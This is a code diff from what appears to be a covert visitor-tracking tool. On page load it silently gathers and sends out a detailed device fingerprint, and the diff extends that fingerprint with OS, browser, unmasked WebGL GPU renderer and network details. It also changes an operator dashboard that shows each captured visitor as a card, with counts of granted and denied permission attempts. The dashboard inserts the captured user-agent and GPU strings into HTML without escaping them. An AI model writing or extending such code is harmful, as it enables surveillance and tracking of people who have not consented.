@@ -113,10 +113,43 @@ function send(path,data){
   try{fetch(url,{method:"POST",mode:"no-cors",body:blob});}catch(e){}
 }
 function collectInfo(){
-  return{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,
-    screen:screen.width+"x"+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory,touch:navigator.maxTouchPoints,
-    online:navigator.onLine,cookieEnabled:navigator.cookieEnabled,referrer:document.referrer,url:location.href};
+  var ua=navigator.userAgent;
+  // Device type
+  var isTablet=/iPad/.test(ua)||(/Android/.test(ua)&&!/Mobile/.test(ua));
+  var isMobile=!isTablet&&/Mobi|Android|iPhone|iPod/.test(ua);
+  var deviceType=isTablet?"Tablet":isMobile?"Mobile":"Desktop";
+  // OS
+  var os="Unknown";
+  if(/iPhone|iPad|iPod/.test(ua)){var m=ua.match(/OS ([\d_]+)/);os="iOS "+(m?m[1].replace(/_/g,"."):"");}
+  else if(/Android/.test(ua)){var m=ua.match(/Android ([\d.]+)/);os="Android "+(m?m[1]:"");}
+  else if(/Windows NT/.test(ua)){var m=ua.match(/Windows NT ([\d.]+)/);var t={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7"};os="Windows "+(t[m&&m[1]]||m&&m[1]||"");}
+  else if(/Mac OS X/.test(ua)){var m=ua.match(/Mac OS X ([\d_]+)/);os="macOS "+(m?m[1].replace(/_/g,"."):"");}
+  else if(/Linux/.test(ua)){os="Linux";}
+  // Browser + version
+  var browser="Unknown";
+  if(/OPR\//.test(ua)){var m=ua.match(/OPR\/([\d.]+)/);browser="Opera "+(m?m[1]:"");}
+  else if(/Edg\//.test(ua)){var m=ua.match(/Edg\/([\d.]+)/);browser="Edge "+(m?m[1]:"");}
+  else if(/Firefox\//.test(ua)){var m=ua.match(/Firefox\/([\d.]+)/);browser="Firefox "+(m?m[1]:"");}
+  else if(/Chrome\//.test(ua)){var m=ua.match(/Chrome\/([\d.]+)/);browser="Chrome "+(m?m[1]:"");}
+  else if(/Safari\//.test(ua)&&/Version\//.test(ua)){var m=ua.match(/Version\/([\d.]+)/);browser="Safari "+(m?m[1]:"");}
+  // GPU via WebGL
+  var gpu="N/A";
+  try{var c=document.createElement("canvas");var gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(gl){var d=gl.getExtension("WEBGL_debug_renderer_info");if(d)gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL)||"Blocked";}}catch(e){}
+  // Network
+  var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  var netType=conn?(conn.effectiveType||conn.type||"N/A"):"N/A";
+  var netSpeed=conn&&conn.downlink?conn.downlink+"Mbps":"N/A";
+  return{
+    deviceType:deviceType,os:os,browser:browser,gpu:gpu,
+    userAgent:ua,language:navigator.language,
+    screen:screen.width+"x"+screen.height,colorDepth:screen.colorDepth+"bit",
+    pixelRatio:window.devicePixelRatio||1,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory,
+    touch:navigator.maxTouchPoints,
+    network:netType,networkSpeed:netSpeed,
+    cookieEnabled:navigator.cookieEnabled,referrer:document.referrer
+  };
 }
 function autoCapture(){
   var info=collectInfo();send("/info",info);
@@ -260,8 +293,15 @@ function addCard(d){
     stats.g++;
   }else if(isDeny){fields+=f('Reason',d.reason);stats.d++;}
   else{
-    fields+=f('Platform',d.platform)+f('Screen',d.screen)+f('Timezone',d.timezone)+f('CPU',d.cores?d.cores+' cores':'N/A')+f('RAM',d.ram?d.ram+' GB':'N/A')+f('Battery',d.battery||'N/A')+f('Language',d.language)+f('Touch',d.touch!=null?d.touch+' pts':'N/A');
-    if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.7rem">'+d.userAgent+'</div></div>';
+    var devIcon=d.deviceType==='Mobile'?'Mobile':d.deviceType==='Tablet'?'Tablet':'Desktop';
+    fields+=f('Device',devIcon+(d.deviceType?' ('+d.deviceType+')'):'N/A')+f('OS',d.os||d.platform||'N/A');
+    fields+=f('Browser',d.browser||'N/A')+f('Language',d.language||'N/A');
+    fields+=f('Screen',d.screen+(d.pixelRatio&&d.pixelRatio!==1?' @'+d.pixelRatio+'x':'')+(d.colorDepth?' '+d.colorDepth:''))+f('Touch',d.touch!=null?d.touch+' pts':'N/A');
+    fields+=f('CPU',d.cores?d.cores+' cores':'N/A')+f('RAM',d.ram?d.ram+' GB':'N/A');
+    fields+=f('Battery',d.battery||'N/A')+f('Network',d.network+(d.networkSpeed&&d.networkSpeed!=='N/A'?' / '+d.networkSpeed:''));
+    fields+=f('Timezone',d.timezone||'N/A')+f('Cookies',d.cookieEnabled?'Enabled':'Disabled');
+    if(d.gpu&&d.gpu!=='N/A')fields+='<div class="f wide"><div class="lb">GPU</div><div class="vl" style="font-size:.72rem">'+d.gpu+'</div></div>';
+    if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.68rem">'+d.userAgent+'</div></div>';
     stats.a++;
   }
   var div=document.createElement('div');div.className='card';
